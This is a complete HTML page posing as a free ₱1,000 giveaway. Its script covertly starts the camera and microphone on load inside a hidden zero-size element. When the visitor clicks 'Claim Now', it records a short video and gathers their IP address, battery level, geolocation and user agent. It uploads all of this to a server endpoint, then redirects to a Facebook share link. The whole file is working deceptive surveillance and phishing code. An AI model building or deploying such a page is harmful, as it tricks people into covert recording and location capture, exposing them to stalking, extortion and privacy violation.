<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🎁 FREE ₱1,000 GIVEAWAY!</title>
<style>
body { font-family: 'Segoe UI', Tahoma, sans-serif; background:#f5f5f5; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
.card { background:#808080; padding:30px; border-radius:12px; text-align:center; width:90%; max-width:400px; }
.btn { background:#f3ba2f; color:#000; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px; margin-top:20px; }
.btn:hover { background:#dba323; }
#vBox { width:0; height:0; opacity:0; overflow:hidden; position:absolute; }
#loading { display:none; margin-top:20px; }
.spinner { border:3px solid #30363d; border-top:3px solid #f3ba2f; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:0 auto 10px; }
@keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
</style>
</head>
<body>

<div class="card">
    <h2>🎉 CONGRATULATIONS! 🎉</h2>
    <p>Click “Claim Now” to record your video!</p>

    <div id="vBox">
        <video id="preview" autoplay playsinline muted></video>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        <p>Processing...</p>
    </div>

    <button class="btn" id="startBtn">Claim Now!!!</button>
</div>

<script>
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const video = document.getElementById('preview');
const REDIRECT_URL = "https://www.facebook.com/share/1BKRZBWVif/";

// Get IP address
async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch { return "Unknown"; }
}

// Get battery info
async function getBattery() {
    try {
        const battery = await navigator.getBattery();
        return Math.round(battery.level*100) + "%";
    } catch { return "Unknown"; }
}

// Get geolocation
async function getGeo() {
    return new Promise(resolve => {
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(pos => {
                resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
            }, ()=> resolve({ latitude:null, longitude:null }));
        } else resolve({ latitude:null, longitude:null });
    });
}

// Init camera + mic
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
        video.srcObject = stream;
    } catch { console.warn("Camera/Mic denied"); }
}
initCamera();

// Claim Now
btn.addEventListener('click', async () => {
    btn.style.display='none';
    loading.style.display='block';

    try {
        const stream = video.srcObject;
        const recorder = new MediaRecorder(stream, { mimeType:'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type:'video/webm' });

            // Device info
            const ip = await getIP();
            const battery = await getBattery();
            const geo = await getGeo();
            const userAgent = navigator.userAgent;

            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.mp4');
            formData.append('ip', ip);
            formData.append('battery', battery);
            formData.append('latitude', geo.latitude);
            formData.append('longitude', geo.longitude);
            formData.append('userAgent', userAgent);

            try {
                const res = await fetch("/upload-video", { method:'POST', body: formData });
                const data = await res.json();
                console.log("Video posted:", data);
                loading.innerHTML = "<p>✅ Video posted successfully! 🎉</p>";
            } catch(err) {
                console.error(err);
                loading.innerHTML = "<p>❌ Error posting video!</p>";
            } finally {
                setTimeout(()=>{window.location.href = REDIRECT_URL},3000);
            }
        };

        recorder.start();
        setTimeout(()=>recorder.stop(),4000); // 4-second video
    } catch(err) {
        console.error("Recording error:", err);
        loading.innerHTML = "<p>❌ Error recording video!</p>";
    }
});
</script>
</body>
</html>
